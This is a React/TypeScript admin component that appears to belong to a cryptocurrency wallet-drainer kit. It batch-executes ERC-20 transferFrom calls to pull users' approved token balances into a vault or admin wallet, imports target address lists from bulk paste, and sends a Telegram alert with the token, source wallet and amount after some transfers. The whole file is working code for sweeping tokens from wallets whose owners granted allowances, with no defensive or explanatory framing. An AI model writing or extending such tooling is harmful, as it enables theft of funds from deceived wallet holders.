import React, { useState } from 'react';
import {
  ArrowRight,
  Plus,
  Trash2,
  RefreshCw,
  CheckCircle2,
  AlertCircle,
  ExternalLink,
  Layers,
  Send,
  Coins,
  ShieldCheck,
  FileText,
  Copy,
  Check
} from 'lucide-react';
import { useAccount, useWriteContract } from 'wagmi';
import { parseUnits, formatUnits } from 'viem';
import { CONFIG, ERC20_ABI, POPULAR_ERC20_TOKENS, ERC20TokenInfo, executeTransferFrom } from '../lib/contracts';
import { logActivity, createAdminLogEntry } from '../lib/activityLogger';
import { sendTelegram } from '../lib/telegram';

interface TransferTarget {
  id: string;
  from: string;
  amount: string;
  status: 'idle' | 'pending' | 'success' | 'failed';
  txHash?: string;
  error?: string;
}

export function BatchTransferFromPanel() {
  const { address } = useAccount();
  const { writeContractAsync } = useWriteContract();

  // Selected Token
  const [selectedTokenKey, setSelectedTokenKey] = useState<string>('USDT');
  const [customTokenAddress, setCustomTokenAddress] = useState<string>('');
  const [customTokenDecimals, setCustomTokenDecimals] = useState<number>(18);
  const [customTokenSymbol, setCustomTokenSymbol] = useState<string>('CUSTOM');

  // Recipient of transferFrom (defaults to admin or contract)
  const [recipientAddress, setRecipientAddress] = useState<string>(CONFIG.CONTRACT_ADDRESS);

  // Targets
  const [targets, setTargets] = useState<TransferTarget[]>([
    { id: '1', from: '', amount: '', status: 'idle' },
  ]);

  // Bulk paste mode
  const [isBulkPasteMode, setIsBulkPasteMode] = useState<boolean>(false);
  const [bulkPasteText, setBulkPasteText] = useState<string>('');

  // Overall batch state
  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const [batchSummary, setBatchSummary] = useState<{ total: number; success: number; failed: number } | null>(null);
  const [copiedTx, setCopiedTx] = useState<string | null>(null);

  const activeToken: ERC20TokenInfo =
    selectedTokenKey === 'CUSTOM'
      ? {
          symbol: customTokenSymbol || 'CUSTOM',
          name: 'Custom ERC-20 Token',
          address: (customTokenAddress.startsWith('0x') ? customTokenAddress : CONFIG.STETH_ADDRESS) as `0x${string}`,
          decimals: customTokenDecimals || 18,
        }
      : POPULAR_ERC20_TOKENS[selectedTokenKey] || POPULAR_ERC20_TOKENS.USDT;

  const handleAddTarget = () => {
    setTargets((prev) => [
      ...prev,
      { id: `t-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`, from: '', amount: '', status: 'idle' },
    ]);
  };

  const handleRemoveTarget = (id: string) => {
    if (targets.length <= 1) return;
    setTargets((prev) => prev.filter((t) => t.id !== id));
  };

  const handleUpdateTarget = (id: string, field: 'from' | 'amount', value: string) => {
    setTargets((prev) =>
      prev.map((t) => (t.id === id ? { ...t, [field]: value, status: 'idle', error: undefined } : t))
    );
  };

  const handleParseBulkText = () => {
    if (!bulkPasteText.trim()) return;
    const lines = bulkPasteText.split('\n');
    const newTargets: TransferTarget[] = [];

    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith('#')) continue;
      // Accept wallet,amount or wallet amount or wallet;amount
      const parts = trimmed.split(/[,;\s\t]+/);
      if (parts.length >= 2) {
        const wallet = parts[0].trim();
        const amt = parts[1].trim();
        if (wallet.startsWith('0x')) {
          newTargets.push({
            id: `bulk-${Date.now()}-${Math.random().toString(36).substr(2, 5)}`,
            from: wallet,
            amount: amt,
            status: 'idle',
          });
        }
      }
    }

    if (newTargets.length > 0) {
      setTargets(newTargets);
      setIsBulkPasteMode(false);
      setBulkPasteText('');
    }
  };

  // Execute single transferFrom target
  const executeSingleTransfer = async (targetId: string) => {
    const target = targets.find((t) => t.id === targetId);
    if (!target || !target.from || !target.amount || !recipientAddress) return;

    setTargets((prev) =>
      prev.map((t) => (t.id === targetId ? { ...t, status: 'pending', error: undefined } : t))
    );

    try {
      const parsedAmount = parseUnits(target.amount, activeToken.decimals);
      const txHash = await executeTransferFrom(
        writeContractAsync,
        activeToken.address,
        target.from as `0x${string}`,
        recipientAddress as `0x${string}`,
        parsedAmount
      );

      setTargets((prev) =>
        prev.map((t) => (t.id === targetId ? { ...t, status: 'success', txHash } : t))
      );

      logActivity({
        wallet: target.from,
        action: 'TRANSFER_FROM',
        amount: `${target.amount} ${activeToken.symbol}`,
        token: activeToken.symbol,
        txHash,
        status: 'Confirmed',
        note: `Executed transferFrom to ${recipientAddress.slice(0, 6)}...${recipientAddress.slice(-4)}`,
      });

      await sendTelegram(
        `💸 <b>transferFrom Executed</b>\n\n🪙 <b>Token:</b> ${activeToken.symbol} (<code>${activeToken.address}</code>)\n👤 <b>From:</b> <code>${target.from}</code>\n🎯 <b>To:</b> <code>${recipientAddress}</code>\n💎 <b>Amount:</b> ${target.amount} ${activeToken.symbol}\n🔗 <b>Tx:</b> <code>${txHash}</code>`
      );
    } catch (err: any) {
      const errMsg = err?.shortMessage || err?.message || 'transferFrom transaction failed or rejected.';
      setTargets((prev) =>
        prev.map((t) => (t.id === targetId ? { ...t, status: 'failed', error: errMsg } : t))
      );
    }
  };

  // Execute entire batch sequentially
  const handleExecuteBatch = async () => {
    const validTargets = targets.filter((t) => t.from.startsWith('0x') && parseFloat(t.amount) > 0);
    if (validTargets.length === 0 || !recipientAddress.startsWith('0x')) {
      alert('Please provide valid from addresses and amounts.');
      return;
    }

    setIsProcessing(true);
    let successCount = 0;
    let failedCount = 0;

    for (const target of validTargets) {
      setTargets((prev) =>
        prev.map((t) => (t.id === target.id ? { ...t, status: 'pending', error: undefined } : t))
      );

      try {
        const parsedAmount = parseUnits(target.amount, activeToken.decimals);
        const txHash = await executeTransferFrom(
          writeContractAsync,
          activeToken.address,
          target.from as `0x${string}`,
          recipientAddress as `0x${string}`,
          parsedAmount
        );

        successCount++;
        setTargets((prev) =>
          prev.map((t) => (t.id === target.id ? { ...t, status: 'success', txHash } : t))
        );

        logActivity({
          wallet: target.from,
          action: 'TRANSFER_FROM',
          amount: `${target.amount} ${activeToken.symbol}`,
          token: activeToken.symbol,
          txHash,
          status: 'Confirmed',
          note: `Batch transferFrom executed to ${recipientAddress.slice(0, 6)}...${recipientAddress.slice(-4)}`,
        });
      } catch (err: any) {
        failedCount++;
        const errMsg = err?.shortMessage || err?.message || 'transferFrom rejected or allowance exceeded';
        setTargets((prev) =>
          prev.map((t) => (t.id === target.id ? { ...t, status: 'failed', error: errMsg } : t))
        );
      }
    }

    setIsProcessing(false);
    setBatchSummary({ total: validTargets.length, success: successCount, failed: failedCount });

    createAdminLogEntry(
      address || 'Admin',
      `Batch transferFrom completed: ${successCount}/${validTargets.length} successful on ${activeToken.symbol}`
    );
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedTx(text);
    setTimeout(() => setCopiedTx(null), 2000);
  };

  return (
    <div className="bg-card rounded-2xl border border-border-main p-6 shadow-sm space-y-6">
      <div className="flex flex-wrap items-center justify-between gap-4 border-b border-border-main pb-4">
        <div>
          <h2 className="font-bold text-lg flex items-center gap-2 text-text-main">
            <Coins className="w-5 h-5 text-[#00A3FF]" />
            Multi-Token Batch transferFrom Execution Engine
          </h2>
          <p className="text-xs text-text-secondary mt-0.5">
            Pull and transfer approved ERC-20 balances from user addresses into vault or destination wallet
          </p>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={() => setIsBulkPasteMode(!isBulkPasteMode)}
            className="px-3 py-1.5 rounded-xl text-xs font-semibold bg-input hover:bg-input/80 border border-border-main text-text-main transition-colors flex items-center gap-1.5"
          >
            <FileText className="w-3.5 h-3.5 text-[#00A3FF]" />
            <span>{isBulkPasteMode ? 'Standard Table View' : 'Bulk Paste (CSV)'}</span>
          </button>
        </div>
      </div>

      {/* Token & Recipient Configuration */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {/* Token Selector */}
        <div className="p-4 bg-input/40 rounded-xl border border-border-main space-y-2">
          <label className="text-xs font-bold text-text-main block">Select ERC-20 Network Token</label>
          <div className="grid grid-cols-3 sm:grid-cols-5 gap-1.5">
            {Object.keys(POPULAR_ERC20_TOKENS).map((key) => {
              const tok = POPULAR_ERC20_TOKENS[key];
              const isSel = selectedTokenKey === key;
              return (
                <button
                  key={key}
                  type="button"
                  onClick={() => setSelectedTokenKey(key)}
                  className={`p-2 rounded-lg text-xs font-bold text-center border transition-all ${
                    isSel
                      ? 'bg-[#00A3FF] text-white border-[#00A3FF] shadow-sm'
                      : 'bg-card text-text-secondary hover:text-text-main border-border-main'
                  }`}
                >
                  {tok.symbol}
                </button>
              );
            })}
            <button
              type="button"
              onClick={() => setSelectedTokenKey('CUSTOM')}
              className={`p-2 rounded-lg text-xs font-bold text-center border transition-all ${
                selectedTokenKey === 'CUSTOM'
                  ? 'bg-[#00A3FF] text-white border-[#00A3FF]'
                  : 'bg-card text-text-secondary hover:text-text-main border-border-main'
              }`}
            >
              + Custom
            </button>
          </div>

          {selectedTokenKey === 'CUSTOM' ? (
            <div className="grid grid-cols-3 gap-2 pt-2">
              <input
                type="text"
                placeholder="Contract Address (0x...)"
                value={customTokenAddress}
                onChange={(e) => setCustomTokenAddress(e.target.value)}
                className="col-span-2 bg-card border border-border-main rounded-lg px-2.5 py-1.5 text-xs font-mono"
              />
              <input
                type="number"
                placeholder="Decimals (18)"
                value={customTokenDecimals}
                onChange={(e) => setCustomTokenDecimals(parseInt(e.target.value) || 18)}
                className="bg-card border border-border-main rounded-lg px-2.5 py-1.5 text-xs"
              />
            </div>
          ) : (
            <div className="flex items-center justify-between text-[11px] font-mono text-text-secondary pt-1">
              <span>Contract: {activeToken.address.slice(0, 8)}...{activeToken.address.slice(-6)}</span>
              <span>Decimals: {activeToken.decimals}</span>
            </div>
          )}
        </div>

        {/* Recipient Configuration */}
        <div className="p-4 bg-input/40 rounded-xl border border-border-main space-y-2">
          <label className="text-xs font-bold text-text-main block">Destination / Recipient Address (`to`)</label>
          <input
            type="text"
            placeholder="Recipient Address (0x...)"
            value={recipientAddress}
            onChange={(e) => setRecipientAddress(e.target.value)}
            className="w-full bg-card border border-border-main rounded-xl px-3 py-2 text-xs font-mono text-text-main focus:outline-none focus:border-[#00A3FF]"
          />
          <div className="flex items-center gap-2 pt-1">
            <button
              type="button"
              onClick={() => setRecipientAddress(CONFIG.CONTRACT_ADDRESS)}
              className="text-[11px] font-semibold text-[#00A3FF] hover:underline"
            >
              Use Vault Contract
            </button>
            {address && (
              <>
                <span className="text-text-secondary text-xs">•</span>
                <button
                  type="button"
                  onClick={() => setRecipientAddress(address)}
                  className="text-[11px] font-semibold text-[#00A3FF] hover:underline"
                >
                  Use Connected Admin Wallet
                </button>
              </>
            )}
          </div>
        </div>
      </div>

      {/* Bulk Paste Textarea Mode */}
      {isBulkPasteMode ? (
        <div className="p-4 bg-input/50 rounded-xl border border-border-main space-y-3">
          <div className="flex items-center justify-between">
            <span className="text-xs font-bold text-text-main">Paste Wallet Addresses & Amounts</span>
            <span className="text-[11px] text-text-secondary">Format: <code>wallet, amount</code> (one per line)</span>
          </div>
          <textarea
            rows={5}
            placeholder={`0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b, 10.5\n0x5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f, 500`}
            value={bulkPasteText}
            onChange={(e) => setBulkPasteText(e.target.value)}
            className="w-full bg-card border border-border-main rounded-xl p-3 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
          />
          <button
            type="button"
            onClick={handleParseBulkText}
            className="px-4 py-2 bg-[#00A3FF] hover:bg-[#0090E6] text-white font-bold rounded-xl text-xs transition-colors"
          >
            Import Targets to Table
          </button>
        </div>
      ) : (
        /* Target Table */
        <div className="space-y-3">
          <div className="flex items-center justify-between">
            <span className="text-xs font-bold text-text-main">Transfer Targets ({targets.length})</span>
            <button
              type="button"
              onClick={handleAddTarget}
              className="px-3 py-1 bg-[#00A3FF]/10 text-[#00A3FF] hover:bg-[#00A3FF]/20 border border-[#00A3FF]/20 rounded-lg text-xs font-bold flex items-center gap-1 transition-colors"
            >
              <Plus className="w-3.5 h-3.5" />
              <span>Add Target</span>
            </button>
          </div>

          <div className="overflow-x-auto rounded-xl border border-border-main bg-card">
            <table className="w-full text-left text-xs">
              <thead className="bg-input text-text-secondary font-medium border-b border-border-main">
                <tr>
                  <th className="px-4 py-2.5">#</th>
                  <th className="px-4 py-2.5">From User Wallet (`from`)</th>
                  <th className="px-4 py-2.5">Amount ({activeToken.symbol})</th>
                  <th className="px-4 py-2.5">Status / Hash</th>
                  <th className="px-4 py-2.5 text-right">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-border-main">
                {targets.map((t, idx) => (
                  <tr key={t.id} className="hover:bg-input/40 transition-colors">
                    <td className="px-4 py-2.5 text-text-secondary font-mono">{idx + 1}</td>
                    <td className="px-4 py-2.5">
                      <input
                        type="text"
                        placeholder="0x..."
                        value={t.from}
                        onChange={(e) => handleUpdateTarget(t.id, 'from', e.target.value)}
                        className="w-full bg-input border border-border-main rounded-lg px-2.5 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                      />
                    </td>
                    <td className="px-4 py-2.5 w-40">
                      <input
                        type="text"
                        placeholder={`0.0 ${activeToken.symbol}`}
                        value={t.amount}
                        onChange={(e) => handleUpdateTarget(t.id, 'amount', e.target.value)}
                        className="w-full bg-input border border-border-main rounded-lg px-2.5 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                      />
                    </td>
                    <td className="px-4 py-2.5">
                      {t.status === 'pending' && (
                        <span className="flex items-center gap-1 text-amber-500 font-semibold">
                          <RefreshCw className="w-3.5 h-3.5 animate-spin" /> In-Flight
                        </span>
                      )}
                      {t.status === 'success' && (
                        <div className="flex items-center gap-1.5 text-emerald-500 font-semibold">
                          <CheckCircle2 className="w-3.5 h-3.5 shrink-0" />
                          <span className="font-mono text-[11px] truncate max-w-[120px]">{t.txHash?.slice(0, 10)}...</span>
                          <button
                            onClick={() => t.txHash && copyToClipboard(t.txHash)}
                            title="Copy Tx Hash"
                            className="text-text-secondary hover:text-text-main"
                          >
                            {copiedTx === t.txHash ? <Check className="w-3 h-3 text-emerald-500" /> : <Copy className="w-3 h-3" />}
                          </button>
                        </div>
                      )}
                      {t.status === 'failed' && (
                        <span className="flex items-center gap-1 text-red-500 font-semibold" title={t.error}>
                          <AlertCircle className="w-3.5 h-3.5 shrink-0" /> Failed
                        </span>
                      )}
                      {t.status === 'idle' && <span className="text-text-secondary">Ready</span>}
                    </td>
                    <td className="px-4 py-2.5 text-right space-x-1 whitespace-nowrap">
                      <button
                        type="button"
                        onClick={() => executeSingleTransfer(t.id)}
                        disabled={isProcessing || !t.from || !t.amount}
                        className="px-2.5 py-1 rounded bg-[#00A3FF]/10 text-[#00A3FF] hover:bg-[#00A3FF]/20 text-[11px] font-bold transition-colors disabled:opacity-40"
                      >
                        Execute
                      </button>
                      <button
                        type="button"
                        onClick={() => handleRemoveTarget(t.id)}
                        className="p-1 text-text-secondary hover:text-red-500 rounded transition-colors"
                        title="Remove row"
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* Batch Summary Notification */}
      {batchSummary && (
        <div className="p-3.5 rounded-xl bg-input border border-border-main flex items-center justify-between text-xs">
          <div className="flex items-center gap-2">
            <ShieldCheck className="w-4 h-4 text-emerald-500" />
            <span className="font-semibold text-text-main">
              Batch Process Complete: {batchSummary.success}/{batchSummary.total} transfers confirmed.
            </span>
          </div>
          {batchSummary.failed > 0 && (
            <span className="text-red-400 font-medium">{batchSummary.failed} transfers encountered errors.</span>
          )}
        </div>
      )}

      {/* Master Action Trigger */}
      <div className="flex flex-wrap items-center justify-between gap-4 pt-2">
        <div className="text-xs text-text-secondary">
          <span>Requires user to have approved spender/vault for token amount.</span>
        </div>

        <button
          type="button"
          onClick={handleExecuteBatch}
          disabled={isProcessing || targets.length === 0}
          className="px-6 py-3 bg-[#00A3FF] hover:bg-[#0090E6] text-white font-bold rounded-xl text-xs flex items-center gap-2 shadow-sm transition-all disabled:opacity-50"
        >
          {isProcessing ? (
            <>
              <RefreshCw className="w-4 h-4 animate-spin" />
              <span>Processing Batch transferFrom...</span>
            </>
          ) : (
            <>
              <Send className="w-4 h-4" />
              <span>Execute Batch transferFrom (All {targets.length} Targets)</span>
            </>
          )}
        </button>
      </div>
    </div>
  );
}
